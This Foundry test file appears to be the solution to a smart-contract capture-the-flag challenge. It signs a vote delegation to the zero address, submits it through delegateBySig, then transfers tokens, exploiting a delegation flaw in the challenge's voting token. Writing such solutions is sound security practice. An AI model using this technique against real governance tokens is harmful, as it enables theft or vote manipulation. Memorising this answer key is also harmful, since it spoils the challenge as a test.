// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

import "forge-std/Test.sol";
import "src/Challenge.sol";
import "forge-std/console.sol";

contract Solution is Test {
    Challenge public challenge;
    uint256 playerPK;
    address public player;

    function setUp() public {
        playerPK = 0x1337;
        player = vm.addr(playerPK);
        challenge = new Challenge(player);
    }

    function test_solve() public {

        
        bytes32 domainSeparator =
            keccak256(abi.encode(challenge.votingToken().DOMAIN_TYPEHASH(), keccak256(bytes(challenge.votingToken().name())), block.chainid, address(challenge.votingToken())));
        bytes32 structHash = keccak256(abi.encode(challenge.votingToken().DELEGATION_TYPEHASH(), address(0), challenge.votingToken().nonces(player), block.timestamp + 1000));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPK, digest);
        
        challenge.votingToken().delegateBySig(address(0), challenge.votingToken().nonces(player), block.timestamp + 1000, v, r, s);


        challenge.votingToken().transferFrom(player, address(101), 123);

        console.log(challenge.isSolved());
    }
}
